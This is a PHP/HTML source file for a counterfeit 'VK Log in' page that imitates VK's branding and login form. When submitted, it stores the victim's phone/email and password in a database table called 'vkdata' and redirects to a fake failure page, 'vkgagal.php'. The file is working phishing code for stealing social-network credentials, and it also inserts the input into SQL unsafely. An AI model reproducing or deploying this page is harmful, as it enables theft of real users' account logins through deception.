<?php 
require __DIR__ . '/../conf.php';
if(isset($_POST['submit'])){
  $email = htmlspecialchars($_POST['email']);
  $password = htmlspecialchars($_POST['password']);
  mysqli_query($conn, "INSERT INTO vkdata VALUES ('$email', '$password')");
  header('location: vkgagal.php');
}
 ?>


<!DOCTYPE html>
<html>

<!--Including CSS---->
<link href="https://fonts.googleapis.com/icon?family=Material+Icons|Roboto:400" rel="stylesheet">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="stylesheet" href="https://www.w3schools.com/w3css/4/w3mobile.css">
<link rel="icon" type="image/png" href="res/vkico.png"/>
<link rel="stylesheet" href="stile.css">

<head>
  <title>VK Log in</title>
  <style type="text/css">
  	input {
	width: 300px !important;
}

@media (max-width: 400px) {
  input {
    width: 100% !important;
    margin-top: 0;
  }
}
  </style>
 </head>
 
 <body>
 
 <!-- Top Nav -->
  <div class="topnav" id="myTopnav" style="background-color: #5281B8;">
  <center><img src="res/vktopbar.png" width="35px" height="25px" style="margin-top: 4px"></center>
	</div>
	
 <center>
 
 <br>
	 <h3 style="color: black">Login to VK</h3><br>
	 <form action="" method="POST" style="margin-top: -30px;">
			 <input type="text" name="email" placeholder="Phone or email" maxlength="72" required> <br>
			 <input type="password" name="password" placeholder="Password" maxlength="72" required style="margin-top: 6px"> <br>
			 <input type="submit" name="submit" value="Login" style="
			 width: 277px;
			 margin-top: 6px;
			 height: 40px;
			 color: white;
			 font-weight: bold;
			 border: none;
			 background-color: #5281B8;
			 "> <br>
		 </form>
 </center>
 </body>

</html>